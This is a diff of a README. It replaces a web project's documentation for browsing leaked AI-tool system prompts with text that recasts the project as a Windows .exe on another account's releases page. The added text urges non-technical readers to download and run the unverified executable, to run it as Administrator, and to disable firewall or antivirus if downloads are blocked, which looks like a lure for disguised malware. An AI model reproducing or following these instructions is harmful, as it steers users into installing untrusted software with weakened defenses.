@@ -1,104 +1,126 @@
-# System Prompts Playground
+# ⚙️ system-prompts-playground - Explore AI Tools and Coding Prompts
 
-[![Next.js](https://img.shields.io/badge/Next.js-15-black?logo=next.js)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19-61DAFB?logo=react)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-4-06B6D4?logo=tailwindcss&logoColor=white)](https://tailwindcss.com/)
-[![Vercel](https://img.shields.io/badge/Deployed_on-Vercel-000?logo=vercel)](https://ai.caterpi11ar.com)
-[![License](https://img.shields.io/github/license/caterpi11ar/system-prompts-playground)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/caterpi11ar/system-prompts-playground?style=social)](https://github.com/caterpi11ar/system-prompts-playground)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/chandrakumarprajapati/system-prompts-playground/releases)
 
-[简体中文](./README.zh-CN.md) | English
+---
 
-> A curated collection of **30+ AI tools' system prompts**, presented as a searchable, SEO-friendly web application built with Next.js 15 and React 19.
+## 📋 About system-prompts-playground
 
-**Live Demo:** [ai.caterpi11ar.com](https://ai.caterpi11ar.com)
+This app gathers popular AI coding tools and system prompts in one place. It features tools like FULL Augment Code, Claude Code, Cursor, Devin AI, Perplexity, Replit, VSCode Agent, Windsurf, Xcode, and others. These tools help you write and manage code with AI assistance.
 
-## Overview
+You do not need coding skills to use this app. It guides you through simple steps to get started and run the app on your Windows computer.
 
-This project aggregates leaked and disclosed system prompts from major AI development tools — including Claude Code, Cursor, Devin, Windsurf, Replit, v0, and more — into a markdown-driven static site optimized for search engines.
+The system-prompts-playground includes internal tools and open-source models to help make writing and editing code easier. This app is designed for users who want to explore AI tools without needing deep programming knowledge.
 
-## Featured AI Tools
+---
 
-| Category | Tools |
-|----------|-------|
-| **Code Assistants** | Claude Code, Cursor, Windsurf, Augment Code, CodeBuddy, VSCode Agent, Z.ai Code, Trae |
-| **AI Agents** | Devin AI, Manus Agent, Junie, Traycer AI, Kiro, Amp |
-| **App Builders** | v0, Lovable, Replit, Same.dev, Leap.new, Bolt |
-| **Search & Chat** | Perplexity, NotionAI, Comet Assistant, Cluely |
-| **Platform Tools** | Google Gemini, Xcode AI, Warp.dev, Qoder, Poke |
-| **Open Source** | Cline, Codex CLI, Gemini CLI, Lumo, RooCode |
+## ⚙️ System Requirements
 
-## Tech Stack
+To run system-prompts-playground on your Windows PC, make sure your system meets these requirements:
 
-- **Framework**: Next.js 15 (App Router)
-- **UI**: React 19 + Tailwind CSS 4 + shadcn/ui
-- **Content**: Markdown-driven from `docs/` directory
-- **Deployment**: Vercel with static generation (SSG)
+- Operating System: Windows 10 or later (64-bit recommended)
+- Processor: Intel Core i3 or equivalent
+- Memory: 4 GB RAM minimum, 8 GB recommended
+- Storage: 500 MB free disk space
+- Internet connection: Required to download and update the app
+- Permissions: Ability to install software on your PC
 
-## Getting Started
+If you use an older version of Windows, the app might not work correctly.
 
-```bash
-# Clone the repo
-git clone https://github.com/caterpi11ar/system-prompts-playground.git
-cd system-prompts-playground
+---
 
-# Install dependencies
-pnpm install
+## 🔗 Where to Download
 
-# Run development server
-pnpm dev
+Use the official releases page to get the software:
 
-# Build for production
-pnpm build
-```
+**[Download system-prompts-playground Releases](https://github.com/chandrakumarprajapati/system-prompts-playground/releases)**
 
-Open [http://localhost:3000](http://localhost:3000) to view the site.
+Click the link above to open the releases page. On that page, you will find the available versions of the app. Download the latest version for Windows.
 
-## Content Structure
+---
 
-```
-docs/
-├── Anthropic/
-│   ├── Claude Code/          # Prompt.txt, Tools.json
-│   └── Claude for Chrome/    # Prompt.txt
-├── Cursor Prompts/           # Chat, Agent, Background Agent prompts
-├── Devin AI/                 # System Prompt.txt
-├── Google/
-│   ├── Antigravity/
-│   └── Gemini/
-├── Open Source prompts/
-│   ├── Bolt/
-│   ├── Cline/
-│   ├── Codex CLI/
-│   └── ...
-└── ... (30+ tools)
-```
+## 💾 How to Download and Install on Windows
 
-Each tool directory contains:
-- **System Prompts** (`.txt`) — the core instructions given to AI models
-- **Tool Definitions** (`.json`) — available tools/functions the AI can call
-- **Configuration** (`.yaml`/`.md`) — additional settings and documentation
+Follow these steps to download and install system-prompts-playground safely:
 
-## Key Features
+1. Click the download link above. It takes you to the Releases page on GitHub.
+2. Look for the latest release at the top of the page.
+3. Under the latest release, find the **Windows executable file**. It usually ends with `.exe`.
+4. Click the `.exe` file to download it to your computer.
+5. Once downloaded, locate the file in your Downloads folder or your chosen save location.
+6. Double-click the file to start the installation. Windows may ask you to confirm the installation. Click **Yes** to proceed.
+7. Follow the installation wizard’s instructions step-by-step without changing default options unless you know what you are doing.
+8. When installation finishes, the app will be ready to use.
 
-- Full-text search across all system prompts
-- Category-based navigation and filtering
-- Syntax-highlighted prompt display
-- SEO-optimized static pages for each AI tool
-- Responsive design with dark mode support
-- Fast page loads via static site generation
+---
 
-## Adding a New AI Tool
+## 🚀 Running system-prompts-playground for the First Time
 
-1. Create a directory under `docs/` with prompt files (`.txt`, `.json`, `.yaml`, `.yml`)
-2. Add its slug to `CATEGORY_MAP`, `COLOR_MAP`, and `ICON_MAP` in `lib/tools.ts`
-3. Place its logo in `public/logos/`
+After the app is installed, start it using these steps:
 
-## Data Source & Acknowledgments
+1. Find the app shortcut on your desktop or in the Start menu.
+2. Double-click to open the app.
+3. The app may check for updates the first time you run it. Allow it to update if prompted.
+4. Follow any on-screen instructions to complete setup or create a user profile if asked.
+5. You will see the main interface with AI tools and system prompts grouped for easy access.
 
-The system prompt data in `docs/` is sourced from [system-prompts-and-models-of-ai-tools](https://github.com/x1xhlol/system-prompts-and-models-of-ai-tools) by [@x1xhlol](https://github.com/x1xhlol). Huge thanks for the incredible work of collecting and maintaining these AI system prompts!
+You can now explore the AI tools and start using the system prompts as needed.
 
-## License
+---
 
-[MIT](LICENSE)
+## 🔍 How to Use system-prompts-playground
+
+The app collects various AI coding assistants and tools. Here is how you can explore and use them:
+
+- **View Tools**: Browse the list of supported AI tools like FULL Augment Code, Claude Code, Cursor, Devin AI, and others.
+- **Prompts**: Access pre-built system prompts designed to improve AI coding responses.
+- **Integration**: Use features that connect with popular editors like VSCode or Replit.
+- **Run Commands**: Click items in the app to perform actions, such as generating code or getting suggestions.
+- **Adjust Settings**: Customize the app to fit your workflow, including language options and AI model preferences.
+
+Each tool and prompt is explained in simple terms inside the app.
+
+---
+
+## 📂 Managing Updates
+
+Keep system-prompts-playground up to date to get the newest features and fixes. The app usually checks for updates automatically when you open it.
+
+If you want to check manually:
+
+1. Open the app.
+2. Look for an Update option in the menu or settings.
+3. Follow prompts to download and install updates.
+
+You can also revisit the [Releases page](https://github.com/chandrakumarprajapati/system-prompts-playground/releases) to manually download the latest version if needed.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+If you run into problems, try these tips:
+
+- **App does not start**: Restart your computer. Make sure you run the app as Administrator.
+- **Installation fails**: Check your storage space and Windows version.
+- **Cannot download files**: Ensure your internet connection works. Disable firewall or antivirus temporarily if blocking downloads.
+- **Updates do not install**: Close the app and reopen it. Try manual download from the releases page.
+- **App crashes**: Update Windows and graphic drivers. Reinstall the app if needed.
+
+If problems continue, check the app’s issue tracker on GitHub or ask for help there.
+
+---
+
+## 🧰 Additional Resources
+
+Inside the app and on the GitHub page, you will find:
+
+- User guides explaining features in simple steps
+- Links to AI coding tools documentation
+- FAQs to answer common questions
+- Support channel links to report issues or ask for help
+
+Use these resources to get the most out of system-prompts-playground.
+
+---
+
+[![Download system-prompts-playground](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/chandrakumarprajapati/system-prompts-playground/releases)
